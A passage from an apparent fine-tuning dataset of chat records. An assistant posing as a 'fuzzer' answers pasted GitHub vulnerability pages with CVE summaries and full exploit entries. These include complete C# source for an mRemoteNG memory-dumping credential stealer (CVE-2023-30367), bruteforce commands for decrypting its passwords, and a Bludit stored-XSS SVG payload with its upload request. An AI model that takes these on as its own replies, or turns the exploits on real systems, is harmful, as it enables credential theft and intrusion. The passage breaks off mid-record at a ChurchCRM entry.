needed.\nExecute mRemoteNGDumper.exe in a terminalsession. Dumped configuration files are saved in a folder named \"dump\".\nDecrypt/Bruteforce dumped files or password strings having custom passwords with mremoteng_decrypt.py (See mremoteng-decrypt.py section)\n\nmRemoteNG_Decrypt.py\nI added a bruteforce functionality to mremoteng-decrypt (See acknowledgements).\nThis can be used to bruteforce custom mRemoteNG configuration/password encryption keys. If no custom key has been configured the script will decrypt the config with default key mR3m. This script can also be used to decrypt configuration files with custom encryption passwords. See also Demo.\n\nDecrypt configuration file with custom encryption password 123: python3 mremoteng_decrypt.py -rf \"C:\\Users\\mbzra\\source\\repos\\mRemoteNG Dumper\\dump\\extracted_Configfile_mRemoteNG_0_09.07.2023.11.01_confCons.xml\" -p 123\nDecrypt password string with custom encryption password 123: python3 mremoteng_decrypt.py -s \"QHrcb7I0KHi6YLFXxv93jenrUmNj5qO30zTM9qXqRUd7ImVm5/ROU7CLQ5u7+7+iOiFrY2BtZSpJ8RrR3jV6LoE=\" -p 123\nDecrypt password string with no custom encryption password: python3 mremoteng_decrypt.py -s \"yW0Ypq/cTcwfHwYxIiHgczcsIKU+jWlfnZBcTdKQImsMbBnP3SLv2h75Z7IAbkFOsD2YzBo2wGk2fhDLpRFH2y8=\"\nBruteforce usage: python3 mremoteng_decrypt.py -s \"[extracted encrypted configuration password]\" -b y -w [path to wordlist]\nBruteforce example: python3 mremoteng_decrypt.py -s \"QHrcb7I0KHi6YLFXxv93jenrUmNj5qO30zTM9qXqRUd7ImVm5/ROU7CLQ5u7+7+iOiFrY2BtZSpJ8RrR3jV6LoE=\" -b y -w .\\wordli.txt\nShould You Be Worried?\nDepends on your threat model. If your computer is already infected by malware that's running in the background with the privileges of your user, this finding doesn't make your situation much worse. However, it might be easier for the malware to be stealthy and evade the antivirus, since unlike KeeTheft or KeeFarce, no process injection or other type of code execution is necessary.\nIf you have a reasonable suspicion that someone could obtain access to your computer and conduct forensic analysis, this could be bad.\nIf you use configuration file encryption with a strong password and your system is clean, you should be fine. No one can steal your passwords remotely over the internet with this finding alone.\nDemo\n\nAcknowledgements to related Projects\n\nPython mRemoteNG Password decryptor by kmahyyg which I modified to add bruteforce functionality.\nKeepass master password dumper by vdohney where I stole this README.md from which I adjusted to my needs.\n\nReferences\n\nhttps://www.secuvera.de/advisories/secuvera-SA-2023-01.txt\nmRemoteNG/mRemoteNG#2420\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-30367\nhttps://cwe.mitre.org/data/definitions/316.html\nhttps://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:N\n\n   \nAbout\n\n        Original PoC for CVE-2023-30367\n      \nResources\n\n        Readme\n \nLicense\n\n     MIT license\n    \nActivity\n \nStars\n\n13\n      stars\n \nWatchers\n\n2\n      watching\n \nForks\n\n1\n      fork\n \n          Report repository\n \n\n    Releases\n\nNo releases published\n    Packages\n      0\n        No packages published \n\nLanguages\n\nC#\n56.3%\n\nPython\n43.7%\n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsMulti-Remote Next Generation Connection Manager (mRemoteNG) is free software that enables users to store and manage multi-protocol connection configurations to remotely connect to systems. mRemoteNG configuration files can be stored in an encrypted state on disk. mRemoteNG version <= v1.76.20 and <= 1.77.3-dev loads configuration files in plain text into memory (after decrypting them if necessary) at application start-up, even if no connection has been established yet. This allows attackers to access contents of configuration files in plain text through a memory dump and thus compromise user credentials when no custom password encryption key has been set. This also bypasses the connection configuration file encryption setting by dumping already decrypted configurations from memory.\n\nexploit\n/windows/local/51637.txt\n# Exploit Title: mRemoteNG v1.77.3.1784-NB - Cleartext Storage of Sensitive Information in Memory\n# Google Dork: -\n# Date: 21.07.2023\n# Exploit Author: Maximilian Barz\n# Vendor Homepage: https://mremoteng.org/\n# Software Link: https://mremoteng.org/download\n# Version: mRemoteNG <= v1.77.3.1784-NB\n# Tested on: Windows 11\n# CVE : CVE-2023-30367\n\n\n\n\n/*\nMulti-Remote Next Generation Connection Manager (mRemoteNG) is free software that enables users to\nstore and manage multi-protocol connection configurations to remotely connect to systems.\n\nmRemoteNG configuration files can be stored in an encrypted state on disk. mRemoteNG version <= v1.76.20 and <= 1.77.3-dev\nloads configuration files in plain text into memory (after decrypting them if necessary) at application start-up,\neven if no connection has been established yet. This allows attackers to access contents of configuration files in plain text\nthrough a memory dump and thus compromise user credentials when no custom password encryption key has been set.\nThis also bypasses the connection configuration file encryption setting by dumping already decrypted configurations from memory.\nFull Exploit and mRemoteNG config file decryption + password bruteforce python script: https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper\n*/\n\n\nusing System;\nusing System.Collections;\nusing System.Collections.Generic;\nusing System.Diagnostics;\nusing System.IO;\nusing System.Reflection;\nusing System.Runtime.InteropServices;\nusing System.Text;\nusing System.Text.RegularExpressions;\n\n\nnamespace mRemoteNGDumper\n{\npublic static class Program\n{\n\npublic enum MINIDUMP_TYPE\n{\nMiniDumpWithFullMemory = 0x00000002\n}\n\n[StructLayout(LayoutKind.Sequential, Pack = 4)]\npublic struct MINIDUMP_EXCEPTION_INFORMATION\n{\npublic uint ThreadId;\npublic IntPtr ExceptionPointers;\npublic int ClientPointers;\n}\n\n[DllImport(\"kernel32.dll\")]\nstatic extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);\n\n[DllImport(\"Dbghelp.dll\")]\nstatic extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, SafeHandle hFile, MINIDUMP_TYPE DumpType, ref MINIDUMP_EXCEPTION_INFORMATION ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);\n\n\nstatic void Main(string[] args)\n{\nstring input;\nbool configfound = false;\nStringBuilder filesb;\nStringBuilder linesb;\nList<string> configs = new List<string>();\n\nProcess[] localByName = Process.GetProcessesByName(\"mRemoteNG\");\n\nif (localByName.Length == 0) {\nConsole.WriteLine(\"[-] No mRemoteNG process was found. Exiting\");\nSystem.Environment.Exit(1);\n}\nstring assemblyPath = Assembly.GetEntryAssembly().Location;\nConsole.WriteLine(\"[+] Creating a memory dump of mRemoteNG using PID {0}.\", localByName[0].Id);\nstring dumpFileName = assemblyPath + \"_\" + DateTime.Now.ToString(\"dd.MM.yyyy.HH.mm.ss\") + \".dmp\";\nFileStream procdumpFileStream = File.Create(dumpFileName);\nMINIDUMP_EXCEPTION_INFORMATION info = new MINIDUMP_EXCEPTION_INFORMATION();\n\n// A full memory dump is necessary in the case of a managed application, other wise no information\n// regarding the managed code will be available\nMINIDUMP_TYPE DumpType = MINIDUMP_TYPE.MiniDumpWithFullMemory;\nMiniDumpWriteDump(localByName[0].Handle, (uint)localByName[0].Id, procdumpFileStream.SafeFileHandle, DumpType, ref info, IntPtr.Zero, IntPtr.Zero);\nprocdumpFileStream.Close();\n\nfilesb = new StringBuilder();\nConsole.WriteLine(\"[+] Searching for configuration files in memory dump.\");\nusing (StreamReader reader = new StreamReader(dumpFileName))\n{\nwhile (reader.Peek() >= 0)\n{\ninput = reader.ReadLine();\nstring pattern = @\"(\\<Node)(.*)(?=\\/>)\\/>\";\nMatch m = Regex.Match(input, pattern, RegexOptions.IgnoreCase);\nif (m.Success)\n{\nconfigfound = true;\n\nforeach (string config in m.Value.Split('>'))\n{\nconfigs.Add(config);\n}\n}\n\n}\n\nreader.Close();\nif (configfound)\n{\nstring currentDir = System.IO.Directory.GetCurrentDirectory();\nstring dumpdir = currentDir + \"/dump\";\nif (!Directory.Exists(dumpdir))\n{\nDirectory.CreateDirectory(dumpdir);\n}\n\nstring savefilepath;\nfor (int i =0; i < configs.Count;i++)\n{\nif (!string.IsNullOrEmpty(configs[i]))\n{\nsavefilepath = currentDir + \"\\\\dump\\\\extracted_Configfile_mRemoteNG_\" + i+\"_\" + DateTime.Now.ToString(\"dd.MM.yyyy.HH.mm\") + \"_confCons.xml\";\nConsole.WriteLine(\"[+] Saving extracted configuration file to: \" + savefilepath);\nusing (StreamWriter writer = new StreamWriter(savefilepath))\n{\nwriter.Write(configs[i]+'>');\nwriter.Close();\n}\n}\n}\nConsole.WriteLine(\"[+] Done!\");\nConsole.WriteLine(\"[+] Deleting memorydump file!\");\nFile.Delete(dumpFileName);\nConsole.WriteLine(\"[+] To decrypt mRemoteNG configuration files and get passwords in cleartext, execute: mremoteng_decrypt.py\\r\\n Example: python3 mremoteng_decrypt.py -rf \\\"\"+ currentDir + \"\\\\dump\\\\extracted_Configfile_mRemoteNG_0_\" + DateTime.Now.ToString(\"dd.MM.yyyy.HH.mm\") + \"_confCons.xml\\\"\" );\n}\nelse\n{\nConsole.WriteLine(\"[-] No configuration file found in memorydump. Exiting\");\nConsole.WriteLine(\"[+] Deleting memorydump file!\");\nFile.Delete(dumpFileName);\n}\n}\n}\n}\n}\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/bludit/bludit/issues/1369#issuecomment-940806199\nAlert: Vulnerability in bludit · Issue #1369 · bludit/bludit · GitHub\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        bludit\n \n/\n\nbludit\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    289\n \n          Star\n 1.2k\n  \nCode\n\nIssues\n51\nPull requests\n4\nActions\n\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Actions\n          Security\n          Insights\n\n \n\n    \n    New issue\n  \n\n \n \n\nHave a question about this project? Sign up for a free GitHub account to open an issue and contact its maintainers and the community.\n  \n\n    Sign up for GitHub\nBy clicking “Sign up for GitHub”, you agree to our terms of service and\n  privacy statement. We’ll occasionally send you account related emails.\n\n    Already on GitHub?\n    Sign in\n    to your account\n  \n\nJump to bottom\n\nAlert: Vulnerability in bludit\n#1369\n\n  Closed\n\nDEV696  opened this issue\nOct 8, 2021\n· 6 comments\n  Closed\n\n    Alert: Vulnerability in bludit\n  \n#1369\nDEV696  opened this issue\nOct 8, 2021\n· 6 comments\n\n Comments\n\n \n      \n            Copy link\n\n \n \n\nDEV696\n      \n\n      commented\n        Oct 8, 2021\n\nHi i have identified a security vulnerability in your application. Kindly do let me know if we can discuss this in detail.\n\n              The text was updated successfully, but these errors were encountered:\n            \n\n \nAll reactions\n\n \n \n      \n            Copy link\n\n \n \nMember\n\ndignajar\n      \n\n      commented\n        Oct 8, 2021\n\nyou can post here the vulnerability.. check if it's not already in the issues.\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \n\n \n      \n            Copy link\n\n \n \nAuthor\n\nDEV696\n      \n\n      commented\n        Oct 8, 2021\n\n        via email \n\nI have attached a PDF POC, so it will be easy to reproduce this scenario.\n\n*Description:*\nStored cross-site scripting (also known as second-order or persistent XSS)\narises when an application receives data from an untrusted source and\nincludes that data within its later HTTP responses in an unsafe way.\n\n*Steps to reproduce the Vulnerability:*\nStep 1: Open login page https://demo.bludit.com/admin/\nStep 2: Now login with the below credential:\n\n*U: adminP: demo123*\nStep 3: Now you will be on https://demo.bludit.com/admin/dashboard,\nNavigate to \"New content\" at the left hand side of the dashboard.\nStep 4: Now click on \"Source code\" next to \"Insert/edit image\" and enter\nthe below payload in the Paragraph field and click save.\n*Payload: <script>alert(1)</script>*\nStep 5: Now click on \"Preview\" to trigger the malicious javascript code.\n…\nOn Fri, 8 Oct 2021 at 18:24, Diego Najar ***@***.***> wrote:\n you can post here the vulnerability.. check if it's not already in the\n issues.\n\n —\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub\n <#1369 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AH2W5FFAA5B2OABA2V6FW3DUF3SZDANCNFSM5FTMVZWA>\n .\n Triage notifications on the go with GitHub Mobile for iOS\n <https://apps.apple.com/app/apple-store/id1477376905?ct=notification-email&mt=8&pt=524675>\n or Android\n <https://play.google.com/store/apps/details?id=com.github.android&referrer=utm_campaign%3Dnotification-email%26utm_medium%3Demail%26utm_source%3Dgithub>.\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \n\n \n      \n            Copy link\n\n \n \nAuthor\n\nDEV696\n      \n\n      commented\n        Oct 12, 2021\n\n        via email \n\nHey Diego\nI request you to please provide an update on the reported issue.\n…\nOn Fri, 8 Oct 2021 at 20:32, DEVENDRA BHATLA ***@***.***> wrote:\n I have attached a PDF POC, so it will be easy to reproduce this scenario.\n\n *Description:*\n Stored cross-site scripting (also known as second-order or persistent XSS)\n arises when an application receives data from an untrusted source and\n includes that data within its later HTTP responses in an unsafe way.\n\n *Steps to reproduce the Vulnerability:*\n Step 1: Open login page https://demo.bludit.com/admin/\n Step 2: Now login with the below credential:\n\n *U: adminP: demo123*\n Step 3: Now you will be on https://demo.bludit.com/admin/dashboard,\n Navigate to \"New content\" at the left hand side of the dashboard.\n Step 4: Now click on \"Source code\" next to \"Insert/edit image\" and enter\n the below payload in the Paragraph field and click save.\n *Payload: <script>alert(1)</script>*\n Step 5: Now click on \"Preview\" to trigger the malicious javascript code.\n\n On Fri, 8 Oct 2021 at 18:24, Diego Najar ***@***.***> wrote:\n\n> you can post here the vulnerability.. check if it's not already in the\n> issues.\n>\n> —\n> You are receiving this because you authored the thread.\n> Reply to this email directly, view it on GitHub\n> <#1369 (comment)>,\n> or unsubscribe\n> <https://github.com/notifications/unsubscribe-auth/AH2W5FFAA5B2OABA2V6FW3DUF3SZDANCNFSM5FTMVZWA>\n> .\n> Triage notifications on the go with GitHub Mobile for iOS\n> <https://apps.apple.com/app/apple-store/id1477376905?ct=notification-email&mt=8&pt=524675>\n> or Android\n> <https://play.google.com/store/apps/details?id=com.github.android&referrer=utm_campaign%3Dnotification-email%26utm_medium%3Demail%26utm_source%3Dgithub>.\n>\n>\n\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \n\n \n      \n            Copy link\n\n \n \nMember\n\ndignajar\n      \n\n      commented\n        Oct 12, 2021\n\nHi, we allowed the user to post any kind of content on the site. They are responsible for the content.\nThe system doesn't provide user registration, only the administrator can register the user.\nThis issue was reported before.\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \ndignajar\n          closed this as completed\nOct 12, 2021\n \n      \n            Copy link\n\n \n \nAuthor\n\nDEV696\n      \n\n      commented\n        Oct 14, 2021\n\nHi, As per the user safety you should disallow some content as most of the user aren't aware of such security risk. If a user download the product from the repository and doesn't fix this on their side, in that case they will be vulnerable to multiple attack scenario.\nAlso even TinyMCE has released a patch when they got this flaw so their users can use a safe product. Below is the link for your reference.\nhttps://portswigger.net/daily-swig/tinymce-suffers-big-xss-flaw\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \n\n \n      \n            Copy link\n\n \n \nAuthor\n\nDEV696\n      \n\n      commented\n        Oct 19, 2021\n\nHi @dignajar\nAny update on this ?\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \n\n \n\nSign up for free\nto join this conversation on GitHub.\n    Already have an account?\n    Sign in to comment\n \n\n    Assignees\n  \n\n    No one assigned\n    Labels\n  \n\n    None yet\n\n    Milestone\n  \n\n      No milestone\n    Development\n  \nNo branches or pull requests\n \n      2 participants\n    \n\n \n\n \n \nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsBludit v3.14.1 is vulnerable to Stored Cross Site Scripting (XSS) via SVG file on site logo. NOTE: the product's security model is that users are trusted by the administrator to insert arbitrary content (users cannot create their own accounts through self-registration).\n\nexploit\n/php/webapps/51476.txt\n# Exploit Title: Bludit CMS v3.14.1 - Stored Cross-Site Scripting (XSS) (Authenticated)\n# Date: 2023-04-15\n# Exploit Author: Rahad Chowdhury\n# Vendor Homepage: https://www.bludit.com/\n# Software Link: https://github.com/bludit/bludit/releases/tag/3.14.1\n# Version: 3.14.1\n# Tested on: Windows 10, PHP 7.4.29, Apache 2.4.53\n# CVE: CVE-2023-31698\n\nSVG Payload\n-------------\n<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"\nhttp://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n<polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\n\"/>\n<script type=\"text/javascript\">\nalert(document.domain);\n</script>\n</svg>\n\nsave this SVG file xss.svg\n\nSteps to Reproduce:\n\n1. At first login your admin panel.\n2. then go to settings and click the logo section.\n3. Now upload xss.svg file so your request data will be\n\nPOST /bludit/admin/ajax/logo-upload HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)\nGecko/20100101 Firefox/112.0\nContent-Type: multipart/form-data;\nboundary=---------------------------15560729415644048492005010998\nReferer: http://127.0.0.1/bludit/admin/settings\nCookie: BLUDITREMEMBERUSERNAME=admin;\nBLUDITREMEMBERTOKEN=139167a80807781336bc7484552bc985;\nBLUDIT-KEY=tmap19d0m813e8rqfft8rsl74i\nContent-Length: 651\n\n-----------------------------15560729415644048492005010998\nContent-Disposition: form-data; name=\"tokenCSRF\"\n\n626c201693546f472cdfc11bed0938aab8c6e480\n-----------------------------15560729415644048492005010998\nContent-Disposition: form-data; name=\"inputFile\"; filename=\"xss.svg\"\nContent-Type: image/svg+xml\n\n<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"\nhttp://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n<polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\n\"/>\n<script type=\"text/javascript\">\nalert(document.domain);\n</script>\n</svg>\n\n-----------------------------15560729415644048492005010998--\n\n4. Now open the logo image link that you upload. You will see XSS pop up.\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/ChurchCRM/CRM/issues/6471\nXSS via Image File · Issue #6471 · ChurchCRM/CRM · GitHub\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        ChurchCRM\n \n/\n\nCRM\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    422\n \n          Star\n 599\n  \nCode\n\nIssues\n330\nPull requests\n3\nDiscussions\n\nActions\n\nProjects\n2\nWiki\n\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Discussions\n          Actions\n          Projects\n          Wiki\n          Security\n          Insights\n\n \n\n    \n    New issue\n  \n\n \n \n\nHave a question about this project? Sign up for a free GitHub account to open an issue and contact its maintainers and the community.\n  \n\n    Sign up for GitHub\nBy clicking “Sign up for GitHub”, you agree to our terms of service and\n  privacy statement. We’ll occasionally send you account related emails.\n\n    Already on GitHub?\n    Sign in\n    to your account\n  \n\nJump to bottom\n\nXSS via Image File\n#6471\n\n  Closed\n\nrahadchowdhury  opened this issue\nApr 16, 2023\n· 4 comments\n · Fixed by #7055\n  Closed\n\n    XSS via Image File\n  \n#6471\nrahadchowdhury  opened this issue\nApr 16, 2023\n· 4 comments\n · Fixed by #7055\n\nAssignees\n\n \nLabels\ngood first issue\n\nIndicates a good issue for first-time contributors\n\nSecurity\nMilestone\n\n5.9.0\n Comments\n\n \n      \n            Copy link\n\n \n \n\nrahadchowdhury\n      \n\n      commented\n        Apr 16, 2023\n\nIf you have the ChurchCRM software running, please file an issue using the Report an issue in the help menu.\nOn what page in the application did you find this issue?\nI got issue CSVImport.php page.\nOn what type of server is this running? Dedicated / Shared hosting?  Linux / Windows?\nWindows Server\nWhat browser (and version) are you running?\nBrave browser [Version 1.50.119 Chromium: 112.0.5615.121]\nWhat version of PHP is the server running?\n7.4.29\nWhat version of SQL Server are you running?\nApache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29\nWhat version of ChurchCRM are you running?\nv4.5.4\nDescription:\nI found Cross site scripting (XSS) vulnerability in your ChurchCRM (v4.5.4) \"Admin\" menu to CSV Import page there Import data CSV uploader option. When I upload image file there malicious code inserted in image then the browser give me result. Because a browser can not know if the script should be trusted or not.\nCMS Version:\nv4.5.4\nAffected URL:\nhttp://127.0.0.1/churchcrm/CSVImport.php\nSteps to Reproduce:\n\nFirst login your admin panel.\nThen click \"Admin\" menu and click \"CSV Import\" and you will get CSV file uploder option.\n\nnow insert xss payload in jpg file using exiftool or from image properties.\n\nafter then upload the jpg file.\nyou will see XSS pop up.\nProof of Concept:\nYou can see the Proof of Concept. Which I've attached screenshots and video to confirm the vulnerability.\n\npoc.mp4\n\nImpact:\nAttackers can make use of this to conduct attacks like phishing, steal sessions etc.\nLet me know if any further info is required.\nThanks & Regards\nRahad Chowdhury\nCyber Security Specialist\nhttps://www.linkedin.com/in/rahadchowdhury/\n\n              The text was updated successfully, but these errors were encountered:\n            \n\n \nAll reactions\n\n \n\nDawoudIO\n            self-assigned this\n    Oct 22, 2023\nDawoudIO\n        added\n  the \n\n  Security\n\n label\n    Oct 22, 2023\n \n      \n            Copy link\n\n \n \n\ngithub-actions\nbot\n      \n\n      commented\n        Nov 21, 2023\n\nThis issue is stale because it has been open 30 days with no activity. Remove stale label or comment or this will be closed in 5 days.\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \ngithub-actions\nbot\n\n        added\n  the \n\n  Stale\n\n label\n    Nov 21, 2023\nDAcodedBEAT\n        removed\n  the \n\n  Stale\n\n label\n    Nov 21, 2023\n \n      \n            Copy link\n\n \n \n\ngithub-actions\nbot\n      \n\n      commented\n        Dec 22, 2023\n\nThis issue is stale because it has been open 30 days with no activity. Remove stale label or comment or this will be closed in 5 days.\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \ngithub-actions\nbot\n\n        added\n  the \n\n  Stale\n\n label\n    Dec 22, 2023\nDAcodedBEAT\n        removed\n  the \n\n  Stale\n\n label\n    Dec 22, 2023\n \n      \n            Copy link\n\n \n \n\ngithub-actions\nbot\n      \n\n      commented\n        Jan 22, 2024\n\nThis issue is stale because it has been open 30 days with no activity. Remove stale label or comment or this will be closed in 5 days.\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \ngithub-actions\nbot\n\n        added\n  the \n\n  Stale\n\n label\n    Jan 22, 2024\nDAcodedBEAT\n        removed\n  the \n\n  Stale\n\n label\n    Jan 24, 2024\n \n      \n            Copy link\n\n \n \n\ngithub-actions\nbot\n      \n\n      commented\n        Feb 23, 2024\n\nThis issue is stale because it has been open 30 days with no activity. Remove stale label or comment or this will be closed in 5 days.\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \ngithub-actions\nbot\n\n        added\n  the \n\n  Stale\n\n label\n    Feb 23, 2024\nDAcodedBEAT\n        removed\n  the \n\n  Stale\n\n label\n    Mar 7, 2024\nDAcodedBEAT\n        added\n  the \n\n  good first issue\n\nIndicates a good issue for first-time contributors\n label\n    Apr 2, 2024\nDAcodedBEAT\n        added this to the   vNext (5.8.0) milestone\n    Apr 15, 2024\nDawoudIO\n        modified the milestones:\n      Current (5.8.0), \n      vNext (5.9.0)\nMay 4, 2024\n\nDAcodedBEAT \n\n      added a commit\n      that referenced\n      this issue\n\n    \nMay 26, 2024\n\n \n\nremove stored XSS from CSVImport.php (#6471)\nf1ae766\n\nDAcodedBEAT\n\n    mentioned this issue\n    \nMay 26, 2024\n\n      Fix assorted security issues\n      #7055\n \n Merged\n1 task\n\nDAcodedBEAT \n\n      added a commit\n      that referenced\n      this issue\n\n    \nMay 27, 2024\n\n \n\nFix assorted security issues (#7055)\n…\n\n2d894bc\n\n# Description & Issue number it closes \n\nFixed assorted security issues reported via Github issues or static\nanalysis tooling.\n\nCloses #6471\nCloses #6848 \nCloses #6853\n\n## Type of change\n\n- [x] Bug fix (non-breaking change which fixes an issue)\n\nDAcodedBEAT\n          closed this as completed\n  in\n    \n      #7055\n\nMay 27, 2024\nrespencer \n\n      pushed a commit\n        to respencer/ChurchCRM\n      that referenced\n      this issue\n\n    \nMay 27, 2024\n\n \n\n \n\nremove stored XSS from CSVImport.php (ChurchCRM#6471)\na01fcdb\n\n \n\nSign up for free\nto join this conversation on GitHub.\n    Already have an account?\n    Sign in to comment\n \n\n    Assignees\n  \n\n \nDawoudIO\n \n    Labels\n  \ngood first issue\n\nIndicates a good issue for first-time contributors\n\nSecurity\n    Projects\n  \n\n    None yet\n \n\n    Milestone\n  \n \n5.9.0\n    Development\n  \nSuccessfully merging a pull request may close this issue.\n \n      Fix assorted security issues\n\n \n      ChurchCRM/CRM\n    \n\n \n      3 participants\n    \n\n \n\n \n\n \n \nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsChurchCRM 